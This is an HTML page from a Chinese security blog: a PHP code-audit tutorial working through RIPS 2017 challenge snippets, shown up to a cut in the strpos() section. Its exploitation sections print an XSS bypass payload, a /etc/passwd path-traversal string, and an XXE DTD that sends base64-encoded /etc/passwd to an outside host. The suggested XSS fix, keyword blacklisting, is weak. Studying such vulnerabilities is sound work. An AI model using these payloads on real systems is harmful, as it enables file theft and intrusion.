@@ -1,0 +1,928 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/j_100px_1.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/j_100px_1.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/j_100px_1.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/j_100px_1.png?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hello, World" />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="PHP代码审计学习 项目来源：https://www.ripstech.com/php-security-calendar-2017/ in_array()函数误用分析123456789101112131415161718192021class Challenge &amp;#123;    const UPLOAD_DIRECTORY = &apos;./solutions/&apos;;    private $file">
+<meta property="og:type" content="article">
+<meta property="og:title" content="php code review">
+<meta property="og:url" content="https://jrdw0.github.io/2018/08/06/php-code-review/index.html">
+<meta property="og:site_name" content="JrD&#39;s blog">
+<meta property="og:description" content="PHP代码审计学习 项目来源：https://www.ripstech.com/php-security-calendar-2017/ in_array()函数误用分析123456789101112131415161718192021class Challenge &amp;#123;    const UPLOAD_DIRECTORY = &apos;./solutions/&apos;;    private $file">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://jrdw0.github.io/2018/08/06/php-code-review/FILTER_VALIDATE_EMAIL.jpg">
+<meta property="og:image" content="https://jrdw0.github.io/2018/08/06/php-code-review/escape.jpg">
+<meta property="og:updated_time" content="2018-08-10T19:52:58.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="php code review">
+<meta name="twitter:description" content="PHP代码审计学习 项目来源：https://www.ripstech.com/php-security-calendar-2017/ in_array()函数误用分析123456789101112131415161718192021class Challenge &amp;#123;    const UPLOAD_DIRECTORY = &apos;./solutions/&apos;;    private $file">
+<meta name="twitter:image" content="https://jrdw0.github.io/2018/08/06/php-code-review/FILTER_VALIDATE_EMAIL.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://jrdw0.github.io/2018/08/06/php-code-review/"/>
+
+
+
+
+
+  <title>php code review | JrD's blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">JrD's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://jrdw0.github.io/2018/08/06/php-code-review/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="JrD">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="JrD's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">php code review</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-08-06T17:28:57+08:00">
+                2018-08-06
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2018/08/06/php-code-review/" class="leancloud_visitors" data-flag-title="php code review">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="PHP代码审计学习"><a href="#PHP代码审计学习" class="headerlink" title="PHP代码审计学习"></a>PHP代码审计学习</h1><hr>
+<p>项目来源：<a href="https://www.ripstech.com/php-security-calendar-2017/" target="_blank" rel="noopener">https://www.ripstech.com/php-security-calendar-2017/</a></p>
+<h2 id="in-array-函数误用"><a href="#in-array-函数误用" class="headerlink" title="in_array()函数误用"></a>in_array()函数误用</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Challenge</span> </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> UPLOAD_DIRECTORY = <span class="string">'./solutions/'</span>;</span><br><span class="line">    <span class="keyword">private</span> $file;</span><br><span class="line">    <span class="keyword">private</span> $whitelist;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = $file;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;whitelist = range(<span class="number">1</span>, <span class="number">24</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (in_array(<span class="keyword">$this</span>-&gt;file[<span class="string">'name'</span>], <span class="keyword">$this</span>-&gt;whitelist)) &#123;</span><br><span class="line">            move_uploaded_file(</span><br><span class="line">                <span class="keyword">$this</span>-&gt;file[<span class="string">'tmp_name'</span>],</span><br><span class="line">                <span class="keyword">self</span>::UPLOAD_DIRECTORY . <span class="keyword">$this</span>-&gt;file[<span class="string">'name'</span>]</span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$challenge = <span class="keyword">new</span> Challenge($_FILES[<span class="string">'solution'</span>]);</span><br></pre></td></tr></table></figure>
+<p>出现问题的源代码如上，使用<code>in_array()</code>函数检查匹配<code>file[&#39;name&#39;]</code>是否在<code>whitelist</code>中，但忽略了<code>in_array()</code>函数中未设置强匹配参数，导致了弱类型问题。</p>
+<p>phpmanual中对in_array的参数解释如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">bool in_array ( mixed $needle , array $haystack [, bool $strict = FALSE ] )</span><br><span class="line"></span><br><span class="line">//大海捞针，在大海（haystack）中搜索针（ needle），如果没有设置 strict 则使用宽松的比较。</span><br><span class="line"></span><br><span class="line">//strict</span><br><span class="line">如果第三个参数 strict 的值为 TRUE 则 in_array() 函数还会检查 needle 的类型是否和 haystack 中的相同。</span><br></pre></td></tr></table></figure>
+<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>其实就是php弱类型的利用，程序员编写时由于不严谨认为输入一定会是int整型数据，我们输入str字符型数据然后利用php的弱类型特点即可。</p>
+<p>弱类型的规律举例如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$array = array(</span><br><span class="line">    &apos;egg&apos; =&gt; true,</span><br><span class="line">    &apos;cheese&apos; =&gt; false,</span><br><span class="line">    &apos;hair&apos; =&gt; 765,</span><br><span class="line">    &apos;goblins&apos; =&gt; null,</span><br><span class="line">    &apos;ogres&apos; =&gt; &apos;no ogres allowed in this array&apos;</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">// Loose checking -- return values are in comments</span><br><span class="line"></span><br><span class="line">// First three make sense, last four do not</span><br><span class="line"></span><br><span class="line">var_dump(in_array(null, $array)); // true</span><br><span class="line">var_dump(in_array(false, $array)); // true</span><br><span class="line">var_dump(in_array(765, $array)); // true</span><br><span class="line">var_dump(in_array(763, $array)); // true</span><br><span class="line">var_dump(in_array(&apos;egg&apos;, $array)); // true</span><br><span class="line">var_dump(in_array(&apos;hhh&apos;, $array)); // true</span><br><span class="line">var_dump(in_array(array(), $array)); // true</span><br><span class="line"></span><br><span class="line">// Strict checking</span><br><span class="line">var_dump(in_array(null, $array, true)); // true</span><br><span class="line">var_dump(in_array(false, $array, true)); // true</span><br><span class="line">var_dump(in_array(765, $array, true)); // true</span><br><span class="line">var_dump(in_array(763, $array, true)); // false</span><br><span class="line">var_dump(in_array(&apos;egg&apos;, $array, true)); // false</span><br><span class="line">var_dump(in_array(&apos;hhh&apos;, $array, true)); // false</span><br><span class="line">var_dump(in_array(array(), $array, true)); // false</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<h3 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h3><p>使用<code>===</code>强匹配或<code>in_array()</code>函数加上第三个参数<code>$strict=ture</code></p>
+<hr>
+<h2 id="一个XSS过滤绕过trick"><a href="#一个XSS过滤绕过trick" class="headerlink" title="一个XSS过滤绕过trick"></a>一个XSS过滤绕过trick</h2><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// composer require "twig/twig"</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'vendor/autoload.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Template</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $twig;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $indexTemplate = <span class="string">'&lt;img '</span> .</span><br><span class="line">            <span class="string">'src="https://loremflickr.com/320/240"&gt;'</span> .</span><br><span class="line">            <span class="string">'&lt;a href="&#123;&#123;link|escape&#125;&#125;"&gt;Next slide »&lt;/a&gt;'</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Default twig setup, simulate loading</span></span><br><span class="line">        <span class="comment">// index.html file from disk</span></span><br><span class="line">        $loader = <span class="keyword">new</span> Twig\Loader\ArrayLoader([</span><br><span class="line">            <span class="string">'index.html'</span> =&gt; $indexTemplate</span><br><span class="line">        ]);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;twig = <span class="keyword">new</span> Twig\Environment($loader);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getNexSlideUrl</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $nextSlide = $_GET[<span class="string">'nextSlide'</span>];</span><br><span class="line">        <span class="keyword">return</span> filter_var($nextSlide, FILTER_VALIDATE_URL);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">render</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;twig-&gt;render(</span><br><span class="line">            <span class="string">'index.html'</span>,</span><br><span class="line">            [<span class="string">'link'</span> =&gt; <span class="keyword">$this</span>-&gt;getNexSlideUrl()]</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">(<span class="keyword">new</span> Template())-&gt;render();</span><br></pre></td></tr></table></figure>
+<p>以php的一个模版引擎twig为例，对url进行XSS安全过滤，其中<code>escape</code>和<code>FILTER_VALIDATE_URL</code>进行了两次过滤转换。</p>
+<p>第一次在第10行，<code>escape</code>过滤，使用的是php自带的<code>htmlspecialchars</code>函数</p>
+<blockquote>
+<p>htmlspecialchars<br>(PHP 4, PHP 5, PHP 7)<br>htmlspecialchars — 将特殊字符转换为 HTML 实体</p>
+<figure class="highlight plain"><figcaption><span>(& 符号)  </span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot; (双引号)  ===============  &amp;quot;</span><br><span class="line">&apos; (单引号)  ===============  &amp;apos;</span><br><span class="line">&lt; (小于号)  ===============  &amp;lt;</span><br><span class="line">&gt; (大于号)  ===============  &amp;gt;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>第二次过滤在22行，使用filter_var函数用<code>FILTER_VALIDATE_URL</code>过滤器对<code>$nextSlide</code>变量进行过滤。检查是否是合法的url。</p>
+<h3 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h3><p>可以看到代码对XSS常用的”‘&lt;&gt;符号进行了过滤，但我们可以利用<code>%0a</code>换行符的trick来逃逸过滤，可以通过以下payload执行，首先引入<code>javascript:</code>协议，然后利用javascript中<code>//</code>代表单行注释，而<code>%250a</code>经过一次urldecode变成<code>%0a</code>换行符，成功逃逸出注释行，从而进入<code>echo</code>函数中形成XSS。<br><code>?nextSlide=javascript://comment%250aalert(1)</code></p>
+<p><strong>稍微总结一下常规bypass思路，试敏感关键函数和敏感符号→试编码或注释符号等混淆方法→试伪协议。</strong></p>
+<h3 id="修复-1"><a href="#修复-1" class="headerlink" title="修复"></a>修复</h3><p>针对XSS敏感关键词进行黑名单过滤</p>
+<hr>
+<h2 id="class-exists函数和实例化可控导致的XXE漏洞"><a href="#class-exists函数和实例化可控导致的XXE漏洞" class="headerlink" title="class_exists函数和实例化可控导致的XXE漏洞"></a>class_exists函数和实例化可控导致的XXE漏洞</h2><h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><p>代码如下<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__autoload</span><span class="params">($className)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">include</span> $className;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$controllerName = $_GET[<span class="string">'c'</span>];</span><br><span class="line">$data = $_GET[<span class="string">'d'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (class_exists($controllerName)) &#123;</span><br><span class="line">    $controller = <span class="keyword">new</span> $controllerName($data[<span class="string">'t'</span>], $data[<span class="string">'v'</span>]);</span><br><span class="line">    $controller-&gt;render();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'There is no page with this name'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HomeController</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $template;</span><br><span class="line">    <span class="keyword">private</span> $variables;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($template, $variables)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;template = $template;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;variables = $variables;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">render</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;variables[<span class="string">'new'</span>]) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'controller rendering new response'</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'controller rendering old response'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>这段代码中有两个安全漏洞。第8行中调用class_exists（）会触发文件包含漏洞。<br>PHP文档中对于<code>class_exist</code>函数的解释如下</p>
+<blockquote>
+<p><strong>class_exists</strong> </p>
+<p>(PHP 4, PHP 5, PHP 7)</p>
+<p>class_exists — 检查类是否已定义</p>
+<p>说明 </p>
+<p>bool class_exists ( string $class_name [, bool $autoload = true ] )检查指定的类是否已定义。</p>
+<p>参数 </p>
+<p>class_name</p>
+<p>类名。名字的匹配是不分区大小写的。</p>
+<p>autoload</p>
+<p>是否默认调用 __autoload。</p>
+</blockquote>
+<p>可知<code>class_exist</code>函数默认调用<code>__autoload</code>函数，其中调用了<code>include</code>函数，会造成文件包含漏洞。可以使用路径穿越来包含任意文件，但是使用像这样的<code>../../../../etc/passwd</code>路径穿越符号的前提是PHP版本在5~5.3(包含5.3)版本之间才可以。<br>但是第二个漏洞仍然适用于当前的PHP版本。在以下几行:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$controllerName = $_GET[<span class="string">'c'</span>]; <span class="comment">//这里$controllerName可控</span></span><br><span class="line">$data = $_GET[<span class="string">'d'</span>];           <span class="comment">//这里$data可控  </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (class_exists($controllerName)) &#123;</span><br><span class="line">    $controller = <span class="keyword">new</span> $controllerName($data[<span class="string">'t'</span>], $data[<span class="string">'v'</span>]);</span><br><span class="line"><span class="comment">//这里使用可控的变量实例化了一个对象，而对象的名称及内容均可控。</span></span><br></pre></td></tr></table></figure></p>
+<p>这样的话，恶意的payload便可以控制实例化过程，任意构造函数，即使代码库本身没有易受攻击的函数。也可以使用PHP内置的SimpleXMLElement函数来进行XXE攻击，进行文件读取操作等行为。</p>
+<h3 id="利用-2"><a href="#利用-2" class="headerlink" title="利用"></a>利用</h3><p> 1.文件包含漏洞<br> 令<code>class_exist</code>函数传入形如<code>../../../../etc/passwd</code>的payload即可；</p>
+<p> 2.实例化SimpleXMLElement进行XXE攻击，查看php手册，SimpleXMLElement构造函数说明如下：</p>
+<blockquote>
+<p><strong>SimpleXMLElement::__construct</strong></p>
+<p>(PHP 5, PHP 7)</p>
+<p>SimpleXMLElement::__construct — Creates a new SimpleXMLElement object</p>
+<p><strong>说明</strong><br>final public SimpleXMLElement::__construct ( string $data [, int $options = 0 [, bool $data_is_url = FALSE [, string $ns = “” [, bool $is_prefix = FALSE ]]]] )</p>
+<p>创建一个新的SimpleXMLElement对象。</p>
+<p>参数 </p>
+<p>data</p>
+<p>格式良好的XML字符串或XML文档的路径或URL（如果 data_is_url是）TRUE。</p>
+<p>options<br>可选地用于指定其他Libxml参数。</p>
+<p>注意：<br>可能需要传递LIBXML_PARSEHUGE 以能够处理深度嵌套的XML或非常大的文本节点。</p>
+<p>data_is_url</p>
+<p>默认情况下data_is_url是FALSE。使用TRUE指定data的路径或URL到一个XML文件，而不是字符串数据。</p>
+<p>ns<br>命名空间前缀或URI。<br>is_prefix<br>TRUE如果ns是前缀，FALSE如果是URI; 默认为FALSE。</p>
+</blockquote>
+<p> 所以构造形如<code>{&quot;SimpleXMLElement&quot;:{&quot;data&quot;:&quot;http://localhost/xxe.xml&quot;,&quot;options&quot;:2,&quot;data_is_url&quot;:1,&quot;ns&quot;:&quot;&quot;,&quot;is_prefix&quot;:0}}</code>其中SimpleXMLElement为实例化函数名，后续payload为SimpleXMLElement构造函数的内容，xxe.xml为XML实体文件。XML实体文件写法可以参考<a href="http://www.4o4notfound.org/index.php/archives/29/#pingback-28" target="_blank" rel="noopener">XXE漏洞分析 from 404 Not Found</a>这里就不多做探讨。</p>
+<p> 举一个例子:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE r [</span><br><span class="line">&lt;!ELEMENT r ANY &gt;</span><br><span class="line">&lt;!ENTITY % sp SYSTEM &quot;http://1.3.3.7:8000/xxe.dtd&quot;&gt;</span><br><span class="line">%sp;</span><br><span class="line">%param1;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;r&gt;&amp;exfil;&lt;/r&gt;</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % data SYSTEM &quot;php://filter/convert.base64-encode/resource=/etc/passwd&quot;&gt;      //这里使用base64编码是起读取文件时不丢失一些特殊符号的作用</span><br><span class="line">&lt;!ENTITY % param1 &quot;&lt;!ENTITY exfil SYSTEM &apos;http://1.3.3.7:8000/?%data;&apos;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="修复-2"><a href="#修复-2" class="headerlink" title="修复"></a>修复</h3><p> 1.将<code>class_exist</code>函数中的<code>bool $autoload</code>参数设为false，即不自动调用<code>__autoload</code>函数；或者<code>__autoload函数</code>中不要使用<code>include</code>函数；或升级PHP版本避免路径遍历符号的传递。</p>
+<p> 2.PHP中防御XXE攻击方法：设置<code>libxml_disable_entity_loader(true);</code>；当然最大的问题还是不应该让实例化对象变成用户输入可控。</p>
+<hr>
+<h2 id="strpo-函数误用"><a href="#strpo-函数误用" class="headerlink" title="strpo()函数误用"></a>strpo()函数误用</h2><p>源码如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Login</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($user, $pass)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;loginViaXml($user, $pass);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">loginViaXml</span><span class="params">($user, $pass)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (</span><br><span class="line">            (!strpos($user, <span class="string">'&lt;'</span>) || !strpos($user, <span class="string">'&gt;'</span>)) &amp;&amp;</span><br><span class="line">            (!strpos($pass, <span class="string">'&lt;'</span>) || !strpos($pass, <span class="string">'&gt;'</span>))</span><br><span class="line">        ) &#123;</span><br><span class="line">            $format = <span class="string">'&lt;?xml version="1.0"?&gt;'</span> .</span><br><span class="line">                      <span class="string">'&lt;user v="%s"/&gt;&lt;pass v="%s"/&gt;'</span>;</span><br><span class="line">            $xml = sprintf($format, $user, $pass);</span><br><span class="line">            $xmlElement = <span class="keyword">new</span> SimpleXMLElement($xml);</span><br><span class="line">            <span class="comment">// Perform the actual login.</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;login($xmlElement);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> Login($_POST[<span class="string">'username'</span>], $_POST[<span class="string">'password'</span>]);</span><br></pre></td></tr></table></figure></p>
+<h3 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h3><p>可以看到此段代码的第8，9行使用<code>strpo()</code>函数检查payload中是否有<code>&lt;`</code>&gt;<code>符号，以检查XML利用的敏感符号。检查后传入第11、12行的</code>$format<code>变量中，然后格式化生成XML。</code>strpos()`函数文档如下：</p>
+<blockquote>
+<p><strong>strpos</strong></p>
+<p>(PHP 4, PHP 5, PHP 7)</p>
+<p>strpos — 查找字符串首次出现的位置</p>
